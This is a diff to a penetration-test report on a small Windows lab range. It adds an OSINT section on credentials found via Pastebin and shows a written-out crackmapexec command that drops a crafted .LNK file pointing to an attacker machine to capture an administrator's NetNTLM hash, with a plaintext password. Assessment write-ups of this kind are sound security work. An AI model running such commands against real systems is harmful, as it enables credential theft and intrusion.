@@ -6,15 +6,21 @@ This document presents a detailed account of the penetration testing executed ag
 ## Test Environment
 - **Scope**: Examined IP addresses range from 10.100.1.2 to 10.100.1.7.
 - **Operating Systems**: Targets on Windows Server 2019; Attacks from Kali Linux.
-- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j, pypykatz/mimikatz, Evil-WinRM.
+- **Tools Used**: Nmap, Crackmapexec, Responder, Hashcat, Impacket, Bloodhound, Neo4j, pypykatz/mimikatz, Evil-WinRM, Intelx, DNSDumpster, Pastebin, and Shodan.
 
 ## Key Exploits and Findings
 
+### Open Source Intelligence (OSINT) 
+- **Objectives**: Utilized Intelx, DNSDumpster, Pastebin, and Shodan to obtain as much information as possible through passive reconnaissance to gain initial access.
+- **Methodology**:
+    - Used Intelx, DNSDumpster, Pastebin, and Shodan to obtain as much information through passive reconnaissance.
+    - Using Pastebin, we were able to obtain a valid set of credentials still. 
+
 ### LNK File Drop
-- **Objective**: To obtain FileMaker's NetNTLM hash via a crafted .LNK file.
+- **Objective**: To obtain FileMaker's (administrator) NetNTLM hash via a crafted .LNK file.
 - **Methodology**:
     - Created a .LNK file targeting the attacker’s Kali machine.
-    - Deployed using the command:
+    - Deployed using the command and the credentials obtained through OSINT:
         ```
         crackmapexec smb 10.100.1.4 -u info -p WhenTomorrowisNot@nOption2024 -M slinky -o server=10.100.1.76 name=JK_Flag
         ```
